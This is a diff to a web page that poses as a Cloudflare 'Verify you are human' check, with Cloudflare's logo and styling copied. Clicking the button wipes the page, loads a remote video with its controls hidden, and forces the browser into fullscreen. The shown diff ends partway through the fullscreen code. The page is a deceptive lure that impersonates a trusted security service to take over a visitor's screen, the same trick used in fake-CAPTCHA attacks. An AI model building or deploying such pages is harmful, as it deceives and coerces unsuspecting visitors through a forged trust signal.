@@ -3,68 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare CAPTCHA</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Connection Security Check</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #f3f4f6;
             font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #d3d3d3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             text-align: center;
         }
 
-        .captcha-container {
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            border: 1px solid #ddd;
-            padding: 20px 40px;
-            border-radius: 8px;
-            background-color: white;
+        .container {
+            max-width: 600px;
+            margin: auto;
         }
 
-        .captcha-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .captcha-text {
-            font-size: 14px;
-            color: #555;
+        .logo {
             margin-bottom: 20px;
         }
 
-        .captcha-button {
-            background-color: #0078d4;
+        .logo img {
+            width: 180px;
+        }
+
+        .headline {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            font-size: 14px;
+            margin-bottom: 30px;
+            color: #b3b3b3;
+        }
+
+        .captcha-box {
+            border: 1px solid #d3d3d3;
+            background-color: #222;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+
+        .captcha-box button {
+            background-color: #f68b1f;
             color: white;
             border: none;
             padding: 10px 20px;
             border-radius: 5px;
-            font-size: 16px;
+            font-size: 14px;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .captcha-button:hover {
-            background-color: #005fa3;
+        .captcha-box button:hover {
+            background-color: #e37c17;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #777;
+        }
+
+        .footer a {
+            color: #f68b1f;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="captcha-container">
-        <p class="captcha-title">Verify You Are Human</p>
-        <p class="captcha-text">Please click the button below to prove you are not a robot.</p>
-        <button id="captcha-btn" class="captcha-button">I'm not a robot</button>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Cloudflare_Logo.png" alt="Cloudflare">
+        </div>
+        <p class="headline">Verify you are human by completing the action below.</p>
+        <div class="captcha-box">
+            <button id="captcha-btn">
+                <span>&#9745;</span> Verify you are human
+            </button>
+        </div>
+        <p class="description">
+            This website needs to review the security of your connection before proceeding.
+        </p>
+        <p class="footer">
+            <a href="#">Privacy</a> · <a href="#">Terms</a>
+        </p>
     </div>
 
     <script>
         document.getElementById("captcha-btn").addEventListener("click", function() {
+            // Clear the page content
             document.body.innerHTML = '';
 
+            // Add the video element
             let video = document.createElement('video');
             video.src = 'https://raw.githubusercontent.com/scrinshoted/scrinshoted.github.io/main/media/video.mp4';
             video.style.position = 'fixed';
@@ -80,6 +123,7 @@
             video.controls = false;
             document.body.appendChild(video);
 
+            // Trigger fullscreen
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             } else if (document.documentElement.webkitRequestFullscreen) {
